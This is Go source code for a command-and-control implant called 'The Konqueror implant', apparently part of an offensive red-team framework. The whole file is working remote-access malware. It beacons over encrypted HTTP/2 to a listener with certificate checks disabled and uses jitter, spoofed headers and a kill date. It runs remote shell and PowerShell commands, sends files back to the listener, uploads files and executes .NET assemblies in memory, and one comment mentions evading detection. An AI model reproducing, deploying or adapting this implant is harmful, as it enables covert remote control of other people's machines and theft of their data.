package main

import (
	"bufio"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/md5"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	uuid "github.com/satori/go.uuid"
	"golang.org/x/net/http2"
	"io"
	"io/ioutil"
	"math/big"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"../../messages"
	"../execute-assembly"
	"../ps"
)

const _timeLayout = "2006-01-02 15:04:05"

// Describes a implant object
type implant struct {
	UUID              uuid.UUID
	httpClient        *http.Client
	pid               int
	ppid              int
	OS                string
	CWD               string
	hostname          string
	architecture      string
	username          string
	userID            string
	killDate          int64
	sleepTime         time.Duration
	jitter            int
	maxRetry          int
	failedCheckin     int
	checkedIn         bool
	listenerAddress   string
	listenerUUID      uuid.UUID
	listenerEndpoints []string
	AESKey            []byte
	HMACKey           string
	postHeaders       map[string]string
	getHeaders        map[string]string
	implantType       string
	mutexLock         *sync.Mutex
}

// Main function
func main() {

	// All of the customisable options will be added by the create_implant utility
	listenerAddress := "https://127.0.0.1:9005/"
	listenerUUID := "8a4115e8-c4ad-447a-8ec6-d3ba28e1ca09"
	endpoints := "/result:/domain:/back"
	if strings.HasSuffix(listenerAddress, "/") {
		endpoints = strings.Replace(endpoints, "/", "", -1)
	} else {
		if !strings.Contains(endpoints, "/") {
			listenerAddress += "/"
		}
	}
	endpointsSlice := strings.Split(endpoints, ":")

	// Headers
	postRequestHeaders := make(map[string]string)
	postRequestHeaders["Content-Type"] = "application/json"
	postRequestHeaders["Host"] = "localhost"
	postRequestHeaders["Cookie"] = "PHPSESSID=token"
	postRequestHeaders["X-Requested-With"] = "XMLHttpRequest"
	postRequestHeaders["User-Agent"] = "The Konqueror implant v0.1.0"

	getRequestHeaders := make(map[string]string)
	getRequestHeaders["Host"] = "localhost"
	getRequestHeaders["Cookie"] = "PHPSESSID=token"
	getRequestHeaders["User-Agent"] = "The Konqueror implant v0.1.0"

	tmpTime, err := time.Parse("2006-01-02 15:04:05", "2022-12-12 15:04:22")
	if err != nil {
		panic(err)
	}
	killDate := tmpTime.UTC().UnixNano()
	maxRetry := 5
	sleepTime := time.Second * 5
	jitter := 5
	AESKey := []byte("thekonqueror")
	HMACKey := []byte("thekonqueror")

	hash := md5.New()
	hash.Write(AESKey)
	hashedAESKey := hex.EncodeToString(hash.Sum(nil))
	hash.Reset()
	hash.Write(HMACKey)
	hashedHMACKey := hex.EncodeToString(hash.Sum(nil))

	// TLS Config setup
	tlsConfig := &tls.Config {
		InsecureSkipVerify:   true,
		NextProtos:           []string{"h2"},
	}
	clientTransport := &http2.Transport {
		TLSClientConfig:   tlsConfig,
	}

	// Get system info
	CWD, _ := os.Getwd()
	hostname, _ := os.Hostname()
	userDetails, _ := user.Current()

	// Create the implant object
	konqueror := implant{
		UUID:              uuid.Must(uuid.NewV4()),
		httpClient:        &http.Client{
			Transport:     clientTransport,
		},
		pid:               os.Getpid(),
		ppid: 			   os.Getppid(),
		OS:                runtime.GOOS,
		CWD:               CWD,
		hostname:          hostname,
		architecture:      runtime.GOARCH,
		username:          userDetails.Username,
		userID:            userDetails.Uid,
		killDate:          killDate,
		sleepTime:         sleepTime,
		jitter:            jitter,
		maxRetry:          maxRetry,
		failedCheckin:     0,
		checkedIn:         false,
		listenerAddress:   listenerAddress,
		listenerUUID:      uuid.Must(uuid.FromString(listenerUUID)),
		AESKey:            []byte(hashedAESKey),
		HMACKey:           hashedHMACKey,
		listenerEndpoints: endpointsSlice,
		postHeaders:       postRequestHeaders,
		getHeaders:        getRequestHeaders,
		implantType:       "http2",
		mutexLock:         &sync.Mutex{},
	}

	// Send message to kill to listener
	defer func() {
		task := messages.Task{
			Type:         "implant shutdown",
			UUID:         uuid.Must(uuid.NewV4()),
			ListenerUUID: konqueror.listenerUUID,
			ImplantUUID:  konqueror.UUID,
		}

		// This is for all cases
		JSONTask, err := json.Marshal(task)
		if err != nil {
			panic(err)
		}

		// Encrypt and generate HMAC
		base64Task := base64.StdEncoding.EncodeToString(JSONTask)
		encryptedTask := konqueror.encrypt([]byte(base64Task))
		messageSignature := konqueror.computeHMAC([]byte(encryptedTask))

		// Create result message for listener
		result := messages.C2Message{
			Message:      encryptedTask,
			HMAC:         messageSignature,
			Type:         "implant shutdown",
			ListenerUUID: konqueror.listenerUUID,
		}

		_, err = konqueror.doPost(result)
	}()

	// Infinite Loop to get a task and execute it
	for {
		// Check if we are past the kill date
		if time.Now().UTC().UnixNano() < konqueror.killDate {
			if konqueror.failedCheckin >= konqueror.maxRetry {
				os.Exit(1)
			}
			// Check if we have already did the first check in
			if konqueror.checkedIn {
				konqueror.beacon()
			} else {
				konqueror.firstCheckIn()
			}
			konqueror.randomSleep()
		} else {
			os.Exit(0)
		}
	}
}

// Method to execute a task and report the results
func (konqueror *implant) execute(task messages.Task) {
	konqueror.randomSleep()
	//task := <- konqueror.tasks

	// Switch based on the task type
	switch task.Type {
	case "cmd":
		// Execute cmd
		stdout, stderr := konqueror.executeShellCommand(task.Args, "cmd")

		if stderr != "" {
			task.Result = stderr
			task.Success = false
		} else {
			// CWD Check for a semi interactive shell
			if task.Args[0] == "cd" {
				// Windows VS Unix
				if konqueror.OS == "windows" {
					if strings.HasPrefix(task.Args[1], "\\") {
						konqueror.CWD = task.Args[1]
					} else {
						if strings.HasSuffix(konqueror.CWD, "\\") {
							konqueror.CWD += task.Args[1]
						} else {
							konqueror.CWD += "\\" + task.Args[1]
						}
					}
				} else {
					// If the directory starts with /
					if strings.HasPrefix(task.Args[1], "/") {
						konqueror.CWD = task.Args[1]
					} else {
						if strings.HasSuffix(konqueror.CWD, "/") {
							konqueror.CWD += task.Args[1]
						} else {
							konqueror.CWD += "/" + task.Args[1]
						}
					}
				}
			}
			// Task was successful
			task.Result = stdout
			task.Success = true
		}
	case "ls":
		// Read CWD content
		files, err := ioutil.ReadDir(task.Args[0])
		if err != nil {
			task.Success = false
			task.Result = err.Error()
			break
		}
		task.Success = true
		// Format all files and directories names
		var allFileNames []string
		for _, file := range files {
			if file.IsDir() {
				allFileNames = append(allFileNames, "d" + file.Mode().Perm().String() + "   " + file.Name())
			} else {
				allFileNames = append(allFileNames, "f" + file.Mode().Perm().String() + "   " + file.Name())
			}
		}
		task.Result = strings.Join(allFileNames, "\n")
	case "set":
		// Change setting
		switch task.Args[0] {
		case "Jitter":
			// Convert to int
			jitter, err := strconv.Atoi(task.Args[1])
			if err != nil {
				task.Result = err.Error()
				task.Success = false
				break
			}
			// Set jitter
			konqueror.jitter = jitter
			task.Result = "Successfully set " + task.Args[0] + " to " + task.Args[1]
			task.Success = true
		case "Sleep":
			// Convert to int
			sleep, err := strconv.Atoi(task.Args[1])
			if err != nil {
				task.Result = err.Error()
				task.Success = false
				break
			}
			// Set sleep time
			konqueror.sleepTime = time.Second * time.Duration(sleep)
			task.Result = "Successfully set " + task.Args[0] + " to " + task.Args[1]
			task.Success = true
		case "KillDate":
			// Parse kill date
			newDate, err := time.Parse(_timeLayout, task.Args[1])
			if err != nil {
				task.Result = err.Error()
				task.Success = false
				break
			}
			// Set the date
			konqueror.killDate = newDate.UTC().UnixNano()
			task.Result = "Successfully set " + task.Args[0] + " to " + task.Args[1]
			task.Success = true
		default:
			task.Success = false
			task.Result = "There is no " + task.Args[0] + " option in the implant"
		}
		// If the task was successful, set the message (same for everyone)
		if task.Success {
			task.Result = "Successfully set " + task.Args[0] + " to " + task.Args[1]
		}
	case "powershell":
		// execute PowerShell command
		stdout, stderr := konqueror.executeShellCommand(task.Args, "powershell")

		if stderr != "" {
			task.Result = stderr
			task.Success = false
		} else {
			// CWD Check for a semi interactive shell
			if task.Args[0] == "cd" {
				if strings.HasPrefix(task.Args[1], "\\") {
					konqueror.CWD = task.Args[1]
				} else {
					if strings.HasSuffix(konqueror.CWD, "\\") {
						konqueror.CWD += task.Args[1]
					} else {
						konqueror.CWD += "\\" + task.Args[1]
					}
				}
			}
			// Task was successful
			task.Result = stdout
			task.Success = true
		}
	case "ifconfig":
		var result string
		// Get network interfaces
		interfaces, err := net.Interfaces()
		if err != nil {
			task.Result = err.Error()
			task.Success = false
			break
		}
		// Get addresses and format them in a single string to send back
		for _, iface := range interfaces {
			address, err := iface.Addrs()
			if err != nil {
				fmt.Println("DEBUG: ", err)
				continue
			}
			for _, addr := range address {
				result += iface.Name + " --> " + addr.String() + "\n"
			}
		}
		task.Success = true
		task.Result = result
	case "ps":
		// List processes
		processList, err := ps.Processes()
		if err != nil {
			task.Result = err.Error()
			task.Success = false
			break
		}
		// Get the info and format them
		var result string
		for x := range processList {
			var process ps.Process
			process = processList[x]
			result += "PPID:\t " +
				strconv.Itoa(process.PPid()) +
				"\tPID:\t" +
				strconv.Itoa(process.Pid()) +
				"\tProgram:\t" + process.Executable() +
				"\tOwner:\t" + process.Owner() + "\n"
		}
		task.Result = result
		task.Success = true
	case "cat":
		// Check if the file starts with an absolute path otherwise will need to add CWD
		fullPath := konqueror.formatPath(task.Args[0])
		// Check if the file exists
		if !konqueror.checkFile(fullPath) {
			task.Success = false
			task.Result = "The file does not exists"
			break
		}
		// Open the file
		file, err := os.Open(fullPath)
		if err != nil {
			task.Result = err.Error()
			task.Success = false
			break
		}
		// Read the content
		reader := bufio.NewReader(file)
		content, err := ioutil.ReadAll(reader)
		if err != nil {
			task.Result = err.Error()
			task.Success = false
			break
		}
		task.Success = true
		// Base64 encode the content to deal with any binary data
		task.Result = base64.StdEncoding.EncodeToString(content)
	case "upload":
		// Download a file from the target machine
		decodedFile, err := base64.StdEncoding.DecodeString(task.Args[0])
		if err != nil {
			task.Result = err.Error()
			task.Success = false
			break
		}
		// Create the file
		file, err := os.Create(task.Args[1])
		if err != nil {
			task.Result = err.Error()
			task.Success = false
			break
		}
		defer file.Close()
		// Write to file
		if _, err := file.Write(decodedFile); err != nil {
			task.Result = err.Error()
			task.Success = false
			break
		}
		if err := file.Sync(); err != nil {
			task.Result = err.Error()
			task.Success = false
			break
		}
		task.Success = true
		task.Result = "Successfully uploaded the file to " + task.Args[1]
	case "download":
		// upload a file to the target machine
		if !konqueror.checkFile(task.Args[0]) {
			task.Result = "The file does not exists"
			task.Success = false
			break
		}
		// Get the right path considering the CWD
		fullPath := konqueror.formatPath(task.Args[0])
		file, err := os.Open(fullPath)
		if err != nil {
			task.Result = err.Error()
			task.Success = false
			break
		}
		defer file.Close()
		// Read content
		reader := bufio.NewReader(file)
		content, err := ioutil.ReadAll(reader)
		if err != nil {
			task.Result = err.Error()
			task.Success = false
			break
		}
		// Convert to base64
		task.Result = base64.StdEncoding.EncodeToString(content)
		task.Success = true
	case "execute-assembly":
		// TODO Look into encrypting them before sending them as they might be flagged
		// Convert the CLR and the Assembly back to bytes
		clr, err := base64.StdEncoding.DecodeString(task.Args[0])
		if err != nil {
			task.Result = err.Error()
			task.Success = false
			break
		}
		assembly, err := base64.StdEncoding.DecodeString(task.Args[1])
		if err != nil {
			task.Result = err.Error()
			task.Success = false
			break
		}

		// parse the offset
		offset, err := strconv.ParseUint(task.Args[4],10, 32)
		if err != nil {
			task.Result = err.Error()
			task.Success = false
			break
		}

		// Execute the assembly
		result, err := execute_assembly.ExecuteAssembly(clr, assembly, task.Args[2], task.Args[3], true, true,  uint32(offset))
		if err != nil {
			task.Result = err.Error()
			task.Success = false
			break
		}

		task.Result = result

		// I'd say it's best to remove the args because they are heavy
		task.Args = []string{}
	case "kill listener":
		os.Exit(0)
	case "kill implant":
		os.Exit(0)
	}

	// Get time for the task once is completed
	now := time.Now()
	date := now.Format(_timeLayout)
	// Set the current time
	task.Date = date

	// This is for all cases
	JSONTask, err := json.Marshal(task)
	if err != nil {
		panic(err)
	}

	// Encrypt and generate HMAC
	base64Task := base64.StdEncoding.EncodeToString(JSONTask)
	encryptedTask := konqueror.encrypt([]byte(base64Task))
	messageSignature := konqueror.computeHMAC([]byte(encryptedTask))

	// Create result message for listener
	result := messages.C2Message{
		Message:      encryptedTask,
		HMAC:         messageSignature,
		Type:         "result",
		ListenerUUID: konqueror.listenerUUID,
	}

	response, err := konqueror.doPost(result)
	if err != nil {
		konqueror.failedCheckin++
		fmt.Println(err)
	} else {
		if response.StatusCode != 200 {
			konqueror.failedCheckin++
		} else {
			// Reset the failed check in
			if konqueror.failedCheckin > 0 && konqueror.failedCheckin < konqueror.maxRetry{
				konqueror.failedCheckin = 0
			}
		}
	}
}

// Method to retrieve a task from the listener
func (konqueror *implant) beacon() {
	// Sleep for random
	konqueror.randomSleep()

	// Get request to one of the endpoints
	request, err := http.NewRequest("GET", konqueror.listenerAddress + konqueror.getEndpoint(), nil)
	if err != nil {
		konqueror.failedCheckin++
		return
	}
	// Set postHeaders
	for index, value := range konqueror.getHeaders {
		request.Header.Set(index, value)
	}
	response, err := konqueror.httpClient.Do(request)
	if err != nil {
		konqueror.failedCheckin++
		return
	}
	// Does it make sense to move this to another method and do check in and result in different requests
	if response.StatusCode == 200 {
		var task messages.Task
		decoder := json.NewDecoder(response.Body)
		err := decoder.Decode(&task)
		if err != nil {
			panic(err)
		}
		// Execute task
		konqueror.execute(task)
	}
}

// Method for sending information on the first checkin
func (konqueror *implant) firstCheckIn() {

	// Create the check in message
	implantDetails := messages.Implant{
		UUID:          konqueror.UUID,
		CWD:           konqueror.CWD,
		OS:            konqueror.OS,
		Arch:          konqueror.architecture,
		Jitter:        konqueror.jitter,
		UserID:        konqueror.userID,
		Hostname:      konqueror.hostname,
		FailedCheckIn: konqueror.failedCheckin,
		MaxRetry:      konqueror.maxRetry,
		PID:           konqueror.pid,
		PPID:          konqueror.ppid,
		Username:      konqueror.username,
		SleepTime:     konqueror.sleepTime,
		ListenerUUID:  konqueror.listenerUUID,
		Status:        "Active",
		KillDate:      konqueror.killDate,
		Type:          konqueror.implantType,
	}

	// Marshal the object
	implantDetailsJSON, err := json.Marshal(implantDetails)
	if err != nil {
		panic(err)
	}
	// Base64 encode
	implantDetailsBase64 := base64.StdEncoding.EncodeToString(implantDetailsJSON)
	// Encrypt the message
	encryptedDetails := konqueror.encrypt([]byte(implantDetailsBase64))
	// compute HMAC
	messageSignature := konqueror.computeHMAC([]byte(encryptedDetails))

	// Create message to send
	message := messages.C2Message{
		Message:      encryptedDetails,
		HMAC:         messageSignature,
		Type:         "first checkin",
		ListenerUUID: konqueror.listenerUUID,
	}

	// Send the message
	response, err := konqueror.doPost(message)
	if err != nil || response.StatusCode != 200 {
		konqueror.failedCheckin++
		return
	}
	// the implant has now checked in
	konqueror.checkedIn = true

	// Reset failed checkin
	if konqueror.failedCheckin > 0 {
		konqueror.failedCheckin = 0
	}

}

// Method to perform a POST request
func (konqueror *implant) doPost(message interface{}) (*http.Response, error) {

	buffer := new(bytes.Buffer)
	err := json.NewEncoder(buffer).Encode(message)
	if err != nil {
		return nil ,err
	}
	// Get full listener address including a random endpoint
	listenerFullAddress := konqueror.listenerAddress + konqueror.getEndpoint()
	// Create request
	request, err := http.NewRequest("POST", listenerFullAddress, buffer)
	if err != nil {
		return nil, err
	}

	// Set the postHeaders
	for index, value := range konqueror.postHeaders {
		request.Header.Set(index, value)
	}
	// Send request
	response, err := konqueror.httpClient.Do(request)
	if err != nil {
		return nil, err
	}

	return response, nil
}

// Method to get the endpoint to send to
func (konqueror *implant) getEndpoint() string {
	reader := rand.Reader
	// Get random number
	index, err := rand.Int(reader, big.NewInt(int64(len(konqueror.listenerEndpoints))))
	if err != nil {
		return konqueror.listenerEndpoints[0]
	}
	return konqueror.listenerEndpoints[int(index.Int64())]
}

// Method to encrypt the data
func (konqueror *implant) encrypt(data []byte) string {
	// Create AES object
	aesCipher, err := aes.NewCipher(konqueror.AESKey)
	if err != nil {
		panic(err)
	}
	// Create new gcm mode
	gcm, err := cipher.NewGCM(aesCipher)
	if err != nil {
		panic(err)
	}
	// generate a nonce
	nonce := make([]byte, gcm.NonceSize())

	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		panic(err)
	}
	// encrypt
	cipherText := gcm.Seal(nonce, nonce, data, nil)
	return base64.RawStdEncoding.EncodeToString(cipherText)
}

// Method to get the HMAC of data
func (konqueror *implant) computeHMAC(data []byte) string {
	h := hmac.New(sha256.New, []byte(konqueror.HMACKey))
	h.Write(data)
	mac := hex.EncodeToString(h.Sum(nil))
	return mac
}

// Method to implement random sleep
func (konqueror *implant) randomSleep() {
	reader := rand.Reader
	jitter, err := rand.Int(reader, big.NewInt(int64(konqueror.jitter)))
	if err != nil {
		panic(err)
	}
	time.Sleep(konqueror.sleepTime + time.Second * time.Duration(jitter.Int64()))
}

// Method to execute a shell command (Windows = cmd.exe or powershell.exe Linux = bash)
func (konqueror *implant) executeShellCommand(command []string, shellType string) (string, string) {
	switch shellType {
	case "cmd":
		var shell, arg1 string
		if konqueror.OS == "windows" {
			shell = "cmd.exe"
			arg1 = "/c"
		} else {
			shell = "/bin/bash"
			arg1 = "-c"
		}
		// Parse the command
		commands := strings.Join(command, " ")
		allCommand := "cd " + konqueror.CWD + " &&" + commands
		result := exec.Command(shell, arg1, allCommand)

		var stdout, stderr bytes.Buffer
		result.Stdout = &stdout
		result.Stderr = &stderr
		err := result.Run()
		if err != nil {
			return "", err.Error()
		}
		return stdout.String(), stderr.String()
	case "powershell":
		var shell = "powershell.exe"
		commands := strings.Join(command, " ")
		allCommand := "cd " + konqueror.CWD + " ; " + commands
		result := exec.Command(shell, allCommand)
		var stdout, stderr bytes.Buffer
		result.Stdout = &stdout
		result.Stderr = &stderr
		err := result.Run()
		if err != nil {
			return "", err.Error()
		}
		return stdout.String(), stderr.String()
	}
	return "",""
}

// Method to check if a file exists on disk
func (konqueror *implant) checkFile(filePath string) bool {
	if _, err := os.Stat(filePath); err != nil {
		if os.IsNotExist(err) {
			return false
		}
	}
	return true
}

// Method to format a path
func (konqueror *implant) formatPath(filePath string) string {
	if strings.HasPrefix(filePath, "C:\\") || strings.HasPrefix(filePath, "/") {
		return filePath
	} else {
		if konqueror.OS == "windows" {
			return konqueror.CWD + "\\" + filePath
		} else {
			return konqueror.CWD + "/" + filePath
		}
	}
}
